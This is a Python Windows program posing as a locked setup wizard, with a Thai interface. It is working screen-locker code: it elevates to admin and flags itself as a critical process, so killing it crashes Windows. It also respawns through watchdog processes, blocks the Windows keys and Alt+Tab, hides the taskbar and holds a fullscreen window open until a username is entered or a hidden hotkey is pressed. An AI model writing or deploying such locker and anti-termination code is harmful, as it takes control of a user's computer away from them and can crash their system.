import tkinter as tk
from tkinter import messagebox
import os
import sys
import subprocess
import time
import threading
import ctypes
import psutil
import tempfile

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)


def set_process_critical(enable=True):
    try:
        ntdll = ctypes.windll.ntdll
        kernel32 = ctypes.windll.kernel32
        PROCESS_BREAK_ON_TERMINATION = 0x1D

        TOKEN_ADJUST_PRIVILEGES = 0x0020
        TOKEN_QUERY = 0x0008
        SE_DEBUG_NAME = "SeDebugPrivilege"
        h_token = ctypes.c_void_p()
        luid = ctypes.c_int64()
        prev = ctypes.c_bool()

        kernel32.OpenProcessToken(kernel32.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ctypes.byref(h_token))
        ctypes.windll.advapi32.LookupPrivilegeValueW(None, SE_DEBUG_NAME, ctypes.byref(luid))

        ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(prev))
        value = ctypes.c_ulong(1 if enable else 0)
        ntdll.NtSetInformationProcess(-1, PROCESS_BREAK_ON_TERMINATION, ctypes.byref(value), ctypes.sizeof(value))
    except Exception as e:
        print(f"[CRITICAL] Failed to set critical flag: {e}")

def unset_process_critical():
    set_process_critical(False)


def is_process_running(pid):
    try:
        p = psutil.Process(pid)
        return p.is_running() and p.status() != psutil.STATUS_ZOMBIE
    except (psutil.NoSuchProcess, psutil.AccessDenied):
        return False

def start_watchdog(main_pid):
    def watchdog_loop():
        watcher_pid = None
        flag_file = os.path.join(tempfile.gettempdir(), "setup_wizard_exit_ok")

        while True:
            if os.path.exists(flag_file):
                print("[WATCHDOG] ปิดโดยเจตนา → ยุติการเฝ้า")
                try:
                    os.remove(flag_file)
                except:
                    pass
                break

            if not is_process_running(main_pid):
                print("[WATCHDOG] Main process ตาย → รีสตาร์ท")
                try:
                    subprocess.Popen([sys.executable, __file__])
                except:
                    pass
                break

            if not watcher_pid or not is_process_running(watcher_pid):
                try:
                    watcher = subprocess.Popen([sys.executable, __file__, "watcher", str(main_pid)])
                    watcher_pid = watcher.pid
                except:
                    pass
            time.sleep(1)
    threading.Thread(target=watchdog_loop, daemon=True).start()


def block_system_keys():
    user32 = ctypes.windll.user32

    user32.RegisterHotKey(None, 1, 0x4000 | 0x0001, 0x5B)  # LWin
    user32.RegisterHotKey(None, 2, 0x4000 | 0x0001, 0x5C)  # RWin
    user32.RegisterHotKey(None, 3, 0x4000 | 0x0002, 0x09)  # Alt+Tab
    user32.RegisterHotKey(None, 4, 0x4000 | 0x0001, 0x09)  # Win+Tab

    def msg_loop():
        msg = ctypes.wintypes.MSG()
        while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
            if msg.message == 0x0312:
                pass
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageW(ctypes.byref(msg))

    threading.Thread(target=msg_loop, daemon=True).start()


def hide_taskbar():
    try:
        # Taskbar
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
        # Start Menu + Clock (ใน Windows 10/11)
        hwnd2 = ctypes.windll.user32.FindWindowW("Shell_SecondaryTrayWnd", None)
        if hwnd2:
            ctypes.windll.user32.ShowWindow(hwnd2, 0)
    except Exception as e:
        print(f"[TASKBAR] ซ่อนไม่ได้: {e}")

def show_taskbar():
    try:
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 1)
        hwnd2 = ctypes.windll.user32.FindWindowW("Shell_SecondaryTrayWnd", None)
        if hwnd2:
            ctypes.windll.user32.ShowWindow(hwnd2, 1)
    except:
        pass


class SetupApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Setup Wizard (Locked)")
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.protocol("WM_DELETE_WINDOW", self._block_close)

        # === บล็อกปุ่มลัดทั้งหมด ===
        self.root.bind("<Alt-F4>", self._block_key)
        self.root.bind("<Escape>", self._block_key)
        self.root.bind("<Control-d>", self._block_key)
        self.root.bind("<Control-D>", self._block_key)
        self.root.bind("<Control>", self._block_key)  # บล็อก Ctrl ทั้งหมด

        # Dev Exit: Alt+Shift+P
        self.root.bind("<Alt-Shift-p>", self._dev_exit)
        self.root.bind("<Alt-Shift-P>", self._dev_exit)

        # === UI ===
        frame = tk.Frame(self.root, padx=40, pady=40)
        frame.pack(expand=True)

        title = tk.Label(frame, text="ตั้งค่าระบบก่อนใช้งาน", font=("Segoe UI", 24, "bold"))
        title.pack(pady=(0, 20))

        tk.Label(frame, text="ชื่อผู้ใช้:", font=("Segoe UI", 14)).pack(anchor="w")
        self.username_var = tk.StringVar()
        tk.Entry(frame, textvariable=self.username_var, font=("Segoe UI", 14), width=30).pack(pady=(0, 15))

        tk.Label(frame, text="โหมดการใช้งาน:", font=("Segoe UI", 14)).pack(anchor="w", pady=(10, 0))
        self.mode_var = tk.StringVar(value="normal")
        modes = [("โหมดปกติ", "normal"), ("โหมดสำหรับนำเสนอ (Presentation)", "presentation"), ("โหมดทดลอง (Lab)", "lab")]
        for text, value in modes:
            tk.Radiobutton(frame, text=text, value=value, variable=self.mode_var, font=("Segoe UI", 12)).pack(anchor="w")

        tk.Button(frame, text="เสร็จสิ้นการตั้งค่า", font=("Segoe UI", 16, "bold"), padx=20, pady=10, command=self.finish_setup).pack(pady=(30, 0))

        hint = tk.Label(self.root, text="*โปรแกรมนี้จะปิดเองเมื่อการตั้งค่าถูกต้องครบถ้วน", font=("Segoe UI", 10))
        hint.pack(side="bottom", pady=10)

    def _block_close(self):
        messagebox.showwarning("ไม่สามารถปิดได้", "กรุณาตั้งค่าให้เสร็จก่อน")

    def _block_key(self, event):
        return "break"

    def _dev_exit(self, event):
        if messagebox.askyesno("Dev Exit", "ออกโปรแกรมด้วยโหมด Dev หรือไม่?"):
            self._create_exit_flag()
            show_taskbar()
            unset_process_critical()
            self.root.destroy()

    def _create_exit_flag(self):
        flag_file = os.path.join(tempfile.gettempdir(), "setup_wizard_exit_ok")
        open(flag_file, 'a').close()

    def finish_setup(self):
        username = self.username_var.get().strip()
        mode = self.mode_var.get()
        if not username:
            messagebox.showerror("กรอกข้อมูลไม่ครบ", "กรุณากรอกชื่อผู้ใช้ก่อน")
            return

        messagebox.showinfo("การตั้งค่าสำเร็จ",
                            f"บันทึกการตั้งค่าเรียบร้อยแล้ว\nผู้ใช้: {username}\nโหมด: {mode}")

        self._create_exit_flag()
        show_taskbar()
        unset_process_critical()
        self.root.destroy()


if __name__ == "__main__":
    # Watcher mode
    if len(sys.argv) > 1 and sys.argv[1] == "watcher":
        main_pid = int(sys.argv[2])
        while True:
            if not is_process_running(main_pid):
                print("[WATCHER] Main died, restarting...")
                subprocess.Popen([sys.executable, __file__])
                break
            time.sleep(1)
    else:
        run_as_admin()
        set_process_critical(True)
        main_pid = os.getpid()
        start_watchdog(main_pid)
        block_system_keys()
        hide_taskbar()  # ซ่อน Taskbar ตั้งแต่เริ่ม

        root = tk.Tk()
        app = SetupApp(root)
        root.mainloop()

        show_taskbar()  # แสดงคืนก่อนจบ
        unset_process_critical()